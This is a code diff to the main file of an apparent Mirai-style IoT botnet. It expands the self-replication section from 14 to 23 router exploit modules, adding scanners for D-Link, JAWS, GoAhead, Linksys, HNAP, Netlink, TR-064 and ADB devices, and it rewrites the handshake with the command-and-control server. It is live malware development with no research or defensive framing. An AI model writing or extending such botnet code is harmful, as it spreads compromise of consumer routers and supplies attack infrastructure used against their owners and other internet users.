@@ -13,7 +13,7 @@
 #endif
 
 #ifdef SELFREP
-/* Self-replication scanners - 14 exploit modules */
+/* Self-replication scanners - 23 exploit modules (all unique, no overlaps) */
 #include "scanner.h"
 #include "huawei.h"
 #include "zyxel.h"
@@ -28,6 +28,16 @@
 #include "hilink.h"
 #include "asus.h"
 #include "fiber.h"
+#include "adb.h"
+/* New router exploit scanners */
+#include "dlink.h"
+#include "jaws.h"
+#include "goahead_scan.h"
+#include "linksys.h"
+#include "linksys8080.h"
+#include "hnap.h"
+#include "netlink.h"
+#include "tr064.h"
 #endif
 
 #ifdef WATCHDOG
@@ -112,6 +122,16 @@ int main(int argc, char **args) {
     hilink_scanner_init();
     asus_scanner_init();
     fiber_scanner_init();
+    exploit_init();  /* ADB scanner */
+    /* New router exploit scanners (all unique, no overlaps) */
+    dlinkscanner_scanner_init();
+    jaws_scanner();
+    goahead_init();
+    linksys_scanner_init();
+    linksysscanner_scanner_init();
+    hnapscanner_scanner_init();
+    netlink_scanner();
+    tr064_scanner();
 #endif
 
     /* Start watchdog if enabled */
@@ -217,15 +237,19 @@ static void establish_connection(void) {
     /* Wait for connection */
     sleep(1);
 
-    /* Send bot identification */
-    uint8_t id_buf[5];
-    id_buf[0] = 0x00;
-    id_buf[1] = 0x00;
-    id_buf[2] = 0x00;
-    id_buf[3] = 0x01; // Bot version
-    id_buf[4] = 0x00; // Source length (none)
+    /* Ultra-simplified handshake - just wait for ACK */
+    uint8_t ack_buf[2];
+    int ack_len = read(fd_serv, ack_buf, 2);
+    
+    if (ack_len != 2 || ack_buf[0] != 0x00 || ack_buf[1] != 0x01) {
+        /* Handshake failed */
+        close(fd_serv);
+        fd_serv = -1;
+        sleep(5);
+        return;
+    }
 
-    write(fd_serv, id_buf, 5);
+    /* Handshake successful - connection established */
 }
 
 static void teardown_connection(void) {
